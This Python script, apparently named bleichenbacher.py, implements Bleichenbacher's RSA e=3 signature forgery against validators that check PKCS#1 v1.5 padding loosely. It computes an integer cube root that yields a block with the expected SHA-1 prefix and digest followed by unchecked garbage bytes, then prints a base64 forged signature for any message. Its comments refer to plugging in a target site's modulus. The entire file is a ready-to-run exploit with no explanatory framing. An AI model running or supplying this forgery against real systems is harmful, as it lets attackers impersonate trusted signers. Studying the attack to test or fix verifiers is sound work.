#!/usr/bin/env python3


import sys
import hashlib
import base64


N = 0xb06004b3528bfd2d187f48e6cb9f3fe79afade6cc3c428dd0577b8bb3e752824b632d100d28b396726a887c5189ded3fe9717d959730dadbf468b2bc76eea3c15091a38b61fdfa46b1510ef885ea3105ae7d7f3007e97c6761bc47e715ba32464c77f7d0cfd2c88c0f53d45404a110d6951d3f4255edc3523921237a86f35fed200c7e45870b822d7652dc896d0de064617dbb48eb9b1d47103f12911b0dab3d91e0fdb847f0b87cf2b20b19d3b951cae86cab611893f6f4cd016c68607e970fc2db800f981d9bb4441fe5d70299693a8ae51f2e9b2656f0c279bf87ecb96a753f231739eb1f9a9d7dd01f15f283dd2da2887e7fdef6aedd61c4ca7b3be1b1cd
E = 3
KEY_BYTES = 256

ASN1_SHA1_PREFIX = bytes.fromhex("3021300906052b0e03021a05000414")


def integer_nth_root(x: int, n: int) -> int:
    """floor(x ** (1/n)) for nonnegative integers x, n -- exact,
    arbitrary-precision integer binary search (no floating point,
    which would lose precision at these bit lengths)."""
    if x < 0:
        raise ValueError("x must be non-negative")
    if x == 0:
        return 0
    lo, hi = 0, 1
    while hi ** n <= x:
        hi <<= 1
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if mid ** n <= x:
            lo = mid
        else:
            hi = mid - 1
    return lo


def forge_signature(message: str) -> int:
    """Return an integer s such that s**E, written as a KEY_BYTES-byte
    big-endian block, is accepted by the vulnerable validator as a
    signature over `message`."""
    digest = hashlib.sha1(message.encode()).digest()


    fixed_prefix = b"\x00\x01\xff\x00" + ASN1_SHA1_PREFIX + digest
    garbage_len = KEY_BYTES - len(fixed_prefix)
    if garbage_len < 0:
        raise ValueError("digest + ASN.1 prefix too long for this key size")


    target_low = int.from_bytes(fixed_prefix + b"\x00" * garbage_len, "big")
    target_high = int.from_bytes(fixed_prefix + b"\xff" * garbage_len, "big")

    candidate = integer_nth_root(target_low, E)
    while candidate ** E < target_low:
        candidate += 1

    cube = candidate ** E
    if cube > target_high:
        raise RuntimeError(
            "No perfect cube fits in the garbage range -- this can happen "
            "for very short keys; shouldn't happen for a 2048-bit key."
        )

    if N > 1 and cube >= N:
        raise RuntimeError(
            "Forged value is not smaller than n -- check N is set correctly."
        )

    return candidate


def main():
    if len(sys.argv) != 2:
        print('Usage: python3 bleichenbacher.py "<message>"')
        sys.exit(1)

    if N <= 1:
        print("Set N to the real modulus from the target site's public key first.")
        sys.exit(1)

    message = sys.argv[1]
    forged = forge_signature(message)
    sig_bytes = forged.to_bytes(KEY_BYTES, "big")
    print(base64.b64encode(sig_bytes).decode())


if __name__ == "__main__":
    main()